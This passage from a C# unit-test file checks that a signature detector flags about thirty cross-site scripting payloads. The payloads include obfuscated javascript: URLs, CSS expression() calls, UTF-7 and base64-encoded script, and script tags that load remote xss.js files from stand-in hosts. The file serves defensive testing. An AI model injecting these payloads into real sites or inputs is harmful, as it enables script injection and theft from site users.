            string sql = @"<DIV STYLE='background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss124 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss125_founded()
        {
            string sql = @"<DIV STYLE='background-image: url(&#1;javascript:alert('XSS'))'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss125 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss126_founded()
        {
            string sql = @"<DIV STYLE='width: expression(alert('XSS'));'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss126 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss127_founded()
        {
            string sql = @"<BASE HREF='javascript:alert('XSS');//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss127 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss128_founded()
        {
            string sql = @"<OBJECT TYPE='text/x-scriptlet' DATA='http://ha.ckers.org/scriptlet.html'></OBJECT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss128 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss129_founded()
        {
            string sql = @"<EMBED SRC='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==' type='image/svg+xml' AllowScriptAccess='always'></EMBED>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss129 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss130_founded()
        {
            string sql = @"<SCRIPT SRC='http://website.com/xss.jpg'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss130 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss131_founded()
        {
            string sql = @"<!--#exec cmd='/bin/echo '<SCR''--><!--#exec cmd='/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>''-->";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss131 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss132_founded()
        {
            string sql = @"<? echo('<SCR)';echo('IPT>alert('XSS')</SCRIPT>'); ?>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss132 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss133_founded()
        {
            string sql = @"<IMG SRC='http://website.com/somecommand.php?somevariables=maliciouscode'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss133 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss134_founded()
        {
            string sql = @"Redirect 302 /a.jpg http://website.com/admin.asp&deleteuser";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss134 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss135_founded()
        {
            string sql = @"<META HTTP-EQUIV='Set-Cookie' Content='USERID=<SCRIPT>alert('XSS')</SCRIPT>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss135 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss136_founded()
        {
            string sql = @"<HEAD><META HTTP-EQUIV='CONTENT-TYPE' CONTENT='text/html; charset=UTF-7'> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss136 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss137_founded()
        {
            string sql = @"<SCRIPT a='>' SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss137 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss138_founded()
        {
            string sql = @"<SCRIPT ='>' SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss138 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss139_founded()
        {
            string sql = @"<SCRIPT a='>' '' SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss139 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss140_founded()
        {
            string sql = @"<SCRIPT 'a='>'' SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss140 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss141_founded()
        {
            string sql = @"<SCRIPT a=`>` SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss141 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss142_founded()
        {
            string sql = @"<SCRIPT a='>'>' SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss142 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss143_founded()
        {
            string sql = @"<SCRIPT>document.write('<SCRI');</SCRIPT>PT SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss143 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss144_founded()
        {
            string sql = @"<A HREF='http://website.com/'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss144 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss145_founded()
        {
            string sql = @"<A HREF='http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss145 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss146_founded()
        {
            string sql = @"<A HREF='http://1113982867/'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss146 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss147_founded()
        {
            string sql = @"<A HREF='http://0x42.0x0000066.0x7.0x93/'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss147 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss148_founded()
        {
            string sql = @"<A HREF='http://0102.0146.0007.00000223/'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss148 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss149_founded()
        {
            string sql = @"<A HREF='htt p://6 6.000146.0x7.147/'>XSS</A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss149 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss150_founded()
        {
            string sql = @"<iframe src='&Tab;javascript:prompt(1)&Tab;'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss150 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss151_founded()
        {
            string sql = @"<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss151 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss152_founded()
        {
            string sql = @"<input/onmouseover='javaSCRIPT&colon;confirm&lpar;1&rpar;'";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss152 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss153_founded()
        {
            string sql = @"<sVg><scRipt >alert&lpar;1&rpar; {Opera}";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss153 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss154_founded()
        {
            string sql = @"<img/src=`` onerror=this.onerror=confirm(1)";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss154 fail");
        }
    }
}
